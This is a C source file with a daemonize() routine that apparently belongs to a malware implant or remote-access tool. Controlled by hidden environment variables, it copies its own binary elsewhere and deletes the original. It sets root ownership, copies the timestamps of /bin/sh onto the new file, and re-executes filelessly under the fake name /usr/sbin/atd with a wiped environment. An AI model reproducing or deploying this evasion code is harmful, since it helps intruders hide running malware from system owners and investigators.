#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <unistd.h>

#ifndef DEFAULT_MTIME_FROM
#define DEFAULT_MTIME_FROM "/bin/sh"
#endif

#ifndef DEFAULT_ENV_SA0
#define DEFAULT_ENV_SA0 "__SA0"
#endif

#ifndef DEFAULT_ENV_SCWD
#define DEFAULT_ENV_SCWD "__SCWD"
#endif

#ifndef DEFAULT_ENV_CLEANUP
#define DEFAULT_ENV_CLEANUP "__CLEANUP"
#endif

#ifndef DEFAULT_ENV_MOVE
#define DEFAULT_ENV_MOVE "__MOVE"
#endif

#ifndef DEFAULT_ARGV0
#define DEFAULT_ARGV0 "/usr/sbin/atd"
#endif

#include "daemonize.h"

int daemonize(bool exit_parent) {
    pid_t pid;
    int i;

	int pipes[2];

    /* Cleanup environment and reexec */
    char self[PATH_MAX] = {};

    if (getenv("PATH") && readlink("/proc/self/exe", self, sizeof(self)-1) != -1) {
        char *set_argv0 = getenv(DEFAULT_ENV_SA0);
		char *set_cwd = getenv(DEFAULT_ENV_SCWD);
		char *cleanup = getenv(DEFAULT_ENV_CLEANUP);
		char *move = getenv(DEFAULT_ENV_MOVE);

        int fd = -1;

        struct stat _stat = {};
        stat(DEFAULT_MTIME_FROM, &_stat);

        if (move) {
            fd = open(self, O_RDONLY);
            unlink(move);
            int fd2 = open(move, O_RDWR | O_CREAT, 0700);
            if (fd2 == -1) {
                move = NULL;
            } else {
                for (;;) {
                    char buffer[4096] = {};
                    int r = read(fd, buffer, sizeof(buffer));
                    if (r <= 0) {
                        close(fd);
                        if (r == -1) {
                            unlink(move);
                            move = NULL;
                        } else {
                            unlink(self);
                            fchmod(fd2, 0511);
                            fchown(fd2, 0, 0);

                            if (_stat.st_mtime) {
                                struct timespec ts[2] = {
                                    _stat.st_atim, _stat.st_mtim
                                };
                                futimens(fd2, ts);
                            }
                        }
                        close(fd2);
                        break;
                    }
                    int w = write(fd2, buffer, r);
                    if (w < 0) {
                        close(fd2);
                        close(fd);
                        unlink(move);
                        move = NULL;
                        break;
                    }
                }
            }
        }

        fd = open(move? move:self, O_CLOEXEC | O_RDONLY);
        if (fd == -1) {
            fd = open(move? move:self, O_RDONLY);
        }

        if (fd != -1) {
            if (cleanup) {
                unlink(move? move:self);
            }

            char *const argv[] = {
                set_argv0? set_argv0 : DEFAULT_ARGV0,
                NULL
            };

            char *const env[] = {NULL};

            if (set_cwd) {
                chdir(set_cwd? set_cwd : "/");
            }

            fexecve(fd, argv, env);

            /* We shouldn't be here */
            close(fd);
        }
    }

    /* Set default "safe" path */
    setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", 1);

    /* Daemonize */

	if (!exit_parent) {
		if (pipe(pipes) == -1) {
			return -1;
		}
	}

    /* create new process */
    pid = fork ( );
    if (pid == -1)
        return -1;

    else if (pid != 0) {
		if (exit_parent) {
			exit (EXIT_SUCCESS);
		} else {
			int status;
			waitpid(pid, &status, 0);
			if (read(pipes[0], &pid, sizeof(pid)) != sizeof(pid))
				pid = -1;

			return pid;
		}
	}

	/* Fork once again */
    pid = fork ( );
    if (pid == -1) {
		if (!exit_parent) {
			close(pipes[1]);
		}

        return -1;
	}

    else if (pid != 0) {
		exit (EXIT_SUCCESS);
	}

	if (!exit_parent) {
		pid_t current_pid = getpid();
		write(pipes[1], &current_pid, sizeof(current_pid));
		close(pipes[1]);
	}

    /* create new session and process group */
    if (setsid ( ) == -1)
        return -1;

    /* set the working directory to the root directory */
    if (chdir ("/") == -1)
        return -1;

#ifndef DEBUG
    /* close all open files--NR_OPEN is overkill, but works */
    for (i = 0; i < sysconf(_SC_OPEN_MAX); i++)
        close (i);

    /* redirect fd's 0,1,2 to /dev/null */
    open ("/dev/null", O_RDWR);
    /* stdin */
    dup (0);
    /* stdout */
    dup (0);
    /* stderror */
#endif

    /* do its daemon thing... */
	return 0;
}
